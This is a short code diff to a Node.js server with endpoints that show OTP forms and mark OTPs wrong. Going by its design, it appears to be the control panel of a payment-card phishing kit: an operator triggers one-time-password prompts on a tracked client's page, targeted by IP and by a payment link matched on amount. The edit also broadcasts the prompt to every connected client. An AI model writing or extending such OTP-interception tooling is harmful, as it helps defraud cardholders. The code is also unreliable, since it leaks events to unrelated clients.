@@ -652,7 +652,6 @@ app.get('/api/transactions', (req, res) => {
   res.json(Array.from(transactions.values()));
 });
 
-// Show OTP form
 app.post('/api/showOTP', (req, res) => {
   const { invoiceId } = req.body;
   const txn = transactions.get(invoiceId);
@@ -661,7 +660,40 @@ app.post('/api/showOTP', (req, res) => {
   txn.otpShown = true;
   txn.status = 'otp_pending';
   txn.otpError = false;
-  io.to(invoiceId).emit('show_otp', { transaction_id: invoiceId });
+  
+  console.log(`Showing OTP for transaction: ${invoiceId}`);
+  
+  // Data to send with the event
+  const otpData = { 
+    transaction_id: invoiceId,
+    invoiceId: invoiceId // Send both formats for compatibility
+  };
+  
+  // Broadcast to ALL clients, not just those in a room
+  io.emit('show_otp', otpData);
+  
+  // Also broadcast specifically to the room
+  io.to(invoiceId).emit('show_otp', otpData);
+  
+  // Try broadcasting to related rooms if we have them
+  if (txn.ip) {
+    io.to(txn.ip).emit('show_otp', otpData);
+  }
+  
+  // Find payment ID if exists
+  let pid = null;
+  paymentLinks.forEach((payment, paymentId) => {
+    if (payment.amount === parseFloat(txn.amount)) {
+      pid = paymentId;
+    }
+  });
+  
+  // If we found a pid, emit to that room too
+  if (pid) {
+    io.to(pid).emit('show_otp', otpData);
+  }
+  
+  console.log(`OTP display requested for invoice: ${invoiceId}`);
   res.json({ status: "success", message: "OTP form shown" });
 });
 
@@ -676,7 +708,6 @@ app.post('/api/wrongOTP', (req, res) => {
   res.json({ status: "success", message: "OTP marked wrong" });
 });
 
-// Check transaction status
 app.get('/api/checkTransactionStatus', (req, res) => {
   const { invoiceId } = req.query;
   const txn = transactions.get(invoiceId);
